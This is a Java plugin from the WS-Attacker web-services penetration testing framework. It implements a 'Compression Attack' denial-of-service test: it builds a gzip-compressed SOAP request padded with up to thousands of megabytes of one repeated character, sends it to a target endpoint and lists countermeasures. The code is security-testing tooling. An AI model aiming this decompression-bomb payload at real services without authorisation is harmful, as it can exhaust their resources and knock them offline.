/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.composition.plugin.option.AbstractOptionString;
import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
import wsattacker.plugin.dos.dosExtension.requestSender.RequestObject;

public class Compression
    extends AbstractDosPlugin
{

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">
    private static final long serialVersionUID = 1L;

    // </editor-fold>
    // Custom Attributes

    private AbstractOptionVarchar usedPayloadChar;

    private AbstractOptionInteger lengthOfPayload;

    @Override
    public void initializeDosPlugin()
    {
        initData();
        // Custom Initilisation
        usedPayloadChar = new OptionSimpleVarchar( "Character to use for xml padding", " ", 1 );
        lengthOfPayload =
            new OptionLimitedInteger( "Size of character payload in MB", 100, 2,
                                      4000 );

        getPluginOptions().add( lengthOfPayload );
        getPluginOptions().add( usedPayloadChar );

    }

    public AbstractOptionInteger getOptionLengthOfPayload()
    {
        return lengthOfPayload;
    }

    public AbstractOptionVarchar getOptionUsedPayloadChar()
    {
        return usedPayloadChar;
    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
    {
        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENT;
    }

    public void initData()
    {
        setName( "Compression Attack" );
        setDescription( "<html><p>This attack checks whether or not a Web service is vulnerable to the \"Compression\" attack.</p>"
            + "<p>A vulnerable Web service will use too much ressources to decompress requests with a huge compression ratio.</p>"
            + "<p>The attack algorithm replaces the string $$PAYLOADELEMENT$$ in the SOAP message below "
            + "with the amount of MB of Characters defined in 8 and 9.</p>"
            + "<p>The placeholder $$PAYLOADELEMENT$$ can be set to any other position in the SOAP message</p>" );
        setCountermeasures( "In order to counter the attack, either request compression has to be turned of completely or some limits on the final size or compression ratio have to be set." );
    }

    @Override
    public void createTamperedRequest()
    {

        StringBuilder sb = new StringBuilder( "" );

        // replace "Payload-Attribute" with Payload-String
        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
        String[] soapMessageParts = soapMessage.split( "\\$\\$PAYLOADELEMENT\\$\\$" );

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        try
        {
            GZIPOutputStream gzos = new GZIPOutputStream( baos );
            gzos.write( soapMessageParts[0].getBytes( "UTF-8" ) );
            byte[] buffer = new byte[1024];
            Arrays.fill( buffer, (byte) this.getOptionUsedPayloadChar().getValue().charAt( 0 ) );
            for ( int i = 0; i < getOptionLengthOfPayload().getValue() * 1000; i++ )
            {
                gzos.write( buffer, 0, 1024 );
            }
            gzos.write( soapMessageParts[1].getBytes( "UTF-8" ) );
        }
        catch ( UnsupportedEncodingException e )
        {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        catch ( IOException e )
        {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        // get HeaderFields from original request, if required add custom
        // headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
        {
            httpHeaderMap.put( entry.getKey(), entry.getValue() );
        }
        httpHeaderMap.put( "Content-Encoding", "gzip" );
        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject( new RequestObject( baos.toByteArray(), getOriginalRequest().getEndpoint(),
                                                          httpHeaderMap ) );
    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}
